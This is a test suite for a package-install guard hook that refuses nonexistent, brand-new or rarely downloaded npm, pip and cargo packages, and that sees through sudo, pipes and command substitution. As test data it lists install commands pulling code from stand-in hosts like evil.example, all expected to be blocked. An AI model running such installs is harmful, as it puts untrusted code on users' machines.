import { expect, test } from 'claude-code/testing'

const DAY = 86400000
const old = new Date(Date.now() - 400 * DAY).toISOString()
const fresh = new Date(Date.now() - 3 * DAY).toISOString()

// A fake registry: name -> npm metadata, plus weekly downloads.
function stubs(on, options: { lockfiles?: Record<string, string>; registry?: Record<string, { created: string; weekly: number }>; answer?: string; fetched?: string[]; saved?: Map<string, unknown> } = {}) {
  const lock = options.lockfiles ?? {}
  const reg = options.registry ?? {}
  const saved = options.saved ?? new Map<string, unknown>()
  on('store.get', ($, e) => ({ value: saved.get(e.key) }))
  on('store.set', ($, e) => {
    saved.set(e.key, e.value)
    return { value: undefined }
  })
  on('fs.exists', ($, e) => ({ value: Object.keys(lock).some((f) => e.path.endsWith(f)) }))
  on('fs.read', ($, e) => ({ value: lock[Object.keys(lock).find((f) => e.path.endsWith(f))!] }))
  on('http.fetch', ($, e) => {
    options.fetched?.push(e.url)
    const npm = /registry\.npmjs\.org\/(.+)$/.exec(e.url)
    if (npm) {
      const name = decodeURIComponent(npm[1])
      const r = reg[name]
      return r ? { value: { status: 200, ok: true, headers: {}, text: JSON.stringify({ time: { created: r.created }, repository: { url: 'git+https://github.com/x/' + name } }) } } : { value: { status: 404, ok: false, headers: {}, text: '' } }
    }
    const dl = /last-week\/(.+)$/.exec(e.url)
    if (dl) return { value: { status: 200, ok: true, headers: {}, text: JSON.stringify({ downloads: reg[dl[1]]?.weekly ?? 0 }) } }
    const py = /pypi\.org\/pypi\/(.+)\/json$/.exec(e.url)
    if (py) return reg[py[1]] ? { value: { status: 200, ok: true, headers: {}, text: JSON.stringify({ info: { project_urls: {} }, releases: { '1.0': [{ upload_time_iso_8601: reg[py[1]].created }] } }) } } : { value: { status: 404, ok: false, headers: {}, text: '' } }
    if (e.url.includes('pypistats')) return { value: { status: 200, ok: true, headers: {}, text: JSON.stringify({ data: { last_week: 5000 } }) } }
    const cr = /crates\.io\/api\/v1\/crates\/(.+)$/.exec(e.url)
    if (cr) return reg[cr[1]] ? { value: { status: 200, ok: true, headers: {}, text: JSON.stringify({ crate: { created_at: reg[cr[1]].created, recent_downloads: reg[cr[1]].weekly * 13, repository: null } }) } } : { value: { status: 404, ok: false, headers: {}, text: '' } }
    return { value: { status: 500, ok: false, headers: {}, text: '' } }
  })
  on('ui.log', () => ({ value: undefined }))
  on('tool.call', ($, e) => {
    if (e.tool === 'AskUserQuestion') return { result: { answers: { [e.questions[0].question]: options.answer ?? 'Refuse' } } }
    return { result: { stdout: 'installed', stderr: '', interrupted: false } }
  })
}

const bash = (command: string) => ({ tool: 'Bash', command })
const RAN = { result: { stdout: 'installed', stderr: '', interrupted: false } }

test('a package that is not on the registry is refused', async ($, on) => {
  stubs(on)
  const out = await $.tool.call(bash('npm install left-padd'))
  expect(out.deny).toContain('"left-padd" does not exist on the registry')
})

test('an established package installs without a question', async ($, on) => {
  const fetched: string[] = []
  stubs(on, { registry: { lodash: { created: old, weekly: 50000000 } }, fetched })
  expect(await $.tool.call(bash('npm i lodash@^4'))).toEqual(RAN)
  expect(fetched.some((u) => u.includes('registry.npmjs.org/lodash'))).toBe(true)
})

test('a brand-new package is held, and Install lets it through', async ($, on) => {
  stubs(on, { registry: { shinynew: { created: fresh, weekly: 90000 } }, answer: 'Install' })
  expect(await $.tool.call(bash('pnpm add shinynew'))).toEqual(RAN)
})

test('a barely-downloaded package is refused by default', async ($, on) => {
  stubs(on, { registry: { obscure: { created: old, weekly: 12 } } })
  expect((await $.tool.call(bash('yarn add obscure'))).deny).toContain('has about 12 downloads a week')
})

test('a package already in the lockfile is not looked up', async ($, on) => {
  const fetched: string[] = []
  stubs(on, { lockfiles: { 'package-lock.json': '{"packages":{"node_modules/@scope/thing":{}}}' }, fetched })
  expect(await $.tool.call(bash('npm install @scope/thing'))).toEqual(RAN)
  expect(fetched).toEqual([])
})

test('pip and cargo are checked too, and scoped specs are stripped', async ($, on) => {
  stubs(on, { registry: { requests: { created: old, weekly: 1 }, serde: { created: old, weekly: 999999 } } })
  expect(await $.tool.call(bash('pip install requests>=2.0'))).toEqual(RAN)
  expect(await $.tool.call(bash('cargo add serde@1'))).toEqual(RAN)
  expect((await $.tool.call(bash('uv add totally-made-up-pkg'))).deny).toContain('does not exist')
})

test('non-install commands, bare installs, and local paths pass through', async ($, on) => {
  const fetched: string[] = []
  stubs(on, { fetched })
  for (const c of ['npm install', 'npm test', 'pip install -r requirements.txt', 'npm install ./local-pkg', 'cargo build', 'git push']) {
    expect(await $.tool.call(bash(c))).toEqual(RAN)
  }
  expect(fetched).toEqual([])
})

test('a lookup is cached for a day', async ($, on) => {
  const fetched: string[] = []
  const saved = new Map<string, unknown>()
  stubs(on, { registry: { lodash: { created: old, weekly: 50000000 } }, fetched, saved })
  await $.tool.call(bash('npm i lodash'))
  await $.tool.call(bash('npm i lodash'))
  expect(fetched.filter((u) => u.includes('registry.npmjs.org/lodash')).length).toBe(1)
  expect(saved.has('pkg:npm:lodash')).toBe(true)
})

test('/pkg-guard off lets everything through', async ($, on) => {
  stubs(on)
  await $.command.run({ command: 'pkg-guard', args: 'off' })
  expect(await $.tool.call(bash('npm install left-padd'))).toEqual(RAN)
})

test('a registry outage fails closed', async ($, on) => {
  on('store.get', () => ({ value: undefined }))
  on('store.set', () => ({ value: undefined }))
  on('fs.exists', () => ({ value: false }))
  on('http.fetch', () => ({ deny: 'network down' }))
  on('ui.log', () => ({ value: undefined }))
  on('tool.call', () => RAN)
  const out = await $.tool.call(bash('npm install anything'))
  expect(out.deny).toContain('could not check this install')
})

test('a lockfile vouches only for an exact package, never a substring', async ($, on) => {
  const fetched: string[] = []
  stubs(on, {
    lockfiles: {
      'package-lock.json': '{"packages":{"node_modules/lodash-es":{},"node_modules/@types/node":{}}}',
      'requirements.txt': 'requests-oauthlib==1.3.1\n# requests is great\nFlask_Login>=0.6\n',
      'Cargo.lock': '[[package]]\nname = "serde_json"\nversion = "1.0"\n',
    },
    fetched,
  })
  // Substrings: looked up, found missing, refused.
  expect((await $.tool.call(bash('npm install lodash'))).deny).toContain('does not exist')
  expect((await $.tool.call(bash('pip install requests'))).deny).toContain('does not exist')
  expect((await $.tool.call(bash('cargo add serde'))).deny).toContain('does not exist')
  // Exact tokens, in each format's own syntax, including PyPI name normalization: no lookup.
  fetched.length = 0
  expect(await $.tool.call(bash('npm install @types/node'))).toEqual(RAN)
  expect(await $.tool.call(bash('pip install flask-login'))).toEqual(RAN)
  expect(await $.tool.call(bash('cargo add serde_json'))).toEqual(RAN)
  expect(fetched).toEqual([])
})

test('pnpm and yarn lockfiles are matched by their own syntax', async ($, on) => {
  const fetched: string[] = []
  stubs(on, { lockfiles: { 'pnpm-lock.yaml': "packages:\n  '@scope/thing@2.0.0':\n    resolution: {}\n  left-pad@1.3.0:\n    resolution: {}\n" }, fetched })
  expect(await $.tool.call(bash('pnpm add @scope/thing'))).toEqual(RAN)
  expect(await $.tool.call(bash('pnpm add left-pad'))).toEqual(RAN)
  expect((await $.tool.call(bash('pnpm add left-padd'))).deny).toBeDefined()
  expect(fetched.filter((u) => u.endsWith('/left-pad'))).toEqual([])
})

test('aliases, URL and git specs, wrappers, python -m pip, and hidden installs are handled', async ($, on) => {
  const fetched: string[] = []
  stubs(on, { registry: { lodash: { created: old, weekly: 50000000 } }, fetched })
  // An npm alias is checked by its target.
  expect(await $.tool.call(bash('npm install my-lodash@npm:lodash@^4'))).toEqual(RAN)
  // URL, git, and tarball installs can't be checked, so they are held.
  expect((await $.tool.call(bash('npm install https://evil.example/pkg.tgz'))).deny).toContain("can't be checked against the registry")
  expect((await $.tool.call(bash('pip install git+https://github.com/x/y.git'))).deny).toContain("can't be checked")
  expect((await $.tool.call(bash('cargo install foo --git https://x.example/foo'))).deny).toContain("can't be checked")
  expect((await $.tool.call(bash('pip install --index-url https://evil.example/simple lodash'))).deny).toContain("can't be checked")
  // sudo, env assignments, and python -m pip are seen through.
  expect((await $.tool.call(bash('sudo npm install -g left-padd'))).deny).toContain('does not exist')
  expect((await $.tool.call(bash('CI=1 python3 -m pip install nonexistent-pkg-xyz'))).deny).toContain('does not exist')
  // An install after a pipe or inside a substitution is still seen.
  expect((await $.tool.call(bash('echo ok | npm install left-padd'))).deny).toContain('does not exist')
  expect((await $.tool.call(bash('echo $(npm install left-padd)'))).deny).toContain('does not exist')
  // Local paths stay allowed.
  expect(await $.tool.call(bash('npm install ./vendor/thing'))).toEqual(RAN)
})
